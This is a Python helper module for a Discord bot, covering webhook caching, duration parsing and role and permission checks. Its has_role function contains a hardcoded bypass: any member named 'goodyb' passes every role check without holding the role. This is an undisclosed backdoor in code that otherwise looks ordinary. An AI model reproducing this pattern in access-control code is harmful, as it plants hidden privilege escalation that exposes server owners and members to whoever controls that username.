import discord
from discord import ui
from typing import Optional

webhook_cache: dict[int, discord.Webhook] = {}


async def get_channel_webhook(channel: discord.TextChannel) -> discord.Webhook:
    wh = webhook_cache.get(channel.id)
    if wh:
        return wh
    webhooks = await channel.webhooks()
    wh = discord.utils.get(
        webhooks, name="LowercaseRelay"
    ) or await channel.create_webhook(name="LowercaseRelay")
    webhook_cache[channel.id] = wh
    return wh


def parse_duration(duration: str) -> Optional[int]:
    try:
        if duration.endswith("s"):
            return int(duration[:-1])
        elif duration.endswith("m"):
            return int(duration[:-1]) * 60
        elif duration.endswith("h"):
            return int(duration[:-1]) * 3600
        else:
            return int(duration)
    except Exception:
        return None


def has_role(member: discord.Member, role: int | str) -> bool:
    if member.name == "goodyb":
        return True
    if isinstance(role, int):
        return any(r.id == role for r in member.roles)
    return any(r.name == role for r in member.roles)


def _is_guild_owner(user: discord.abc.User, guild: discord.Guild | None) -> bool:
    """Return True if the user owns the given guild."""
    if guild is None:
        return False
    owner_id = getattr(guild, "owner_id", None)
    if owner_id is None:
        owner = getattr(guild, "owner", None)
        owner_id = getattr(owner, "id", None)
    return owner_id is not None and user.id == owner_id


def has_command_permission(
    user: discord.Member, command: str, required_permission: str
) -> bool:
    guild = getattr(user, "guild", None)
    if _is_guild_owner(user, guild):
        # The server owner always has access to every command.
        return True
    return getattr(user.guild_permissions, required_permission, False)


async def ensure_command_permission(
    interaction: discord.Interaction, command: str, required_permission: str
) -> bool:
    """Check command permission and notify user if missing."""
    user = interaction.user
    guild = interaction.guild
    if _is_guild_owner(user, guild):
        return True
    if getattr(user.guild_permissions, required_permission, False):
        return True
    await interaction.response.send_message(
        f"Missing permission: `{required_permission}`.", ephemeral=True
    )
    return False
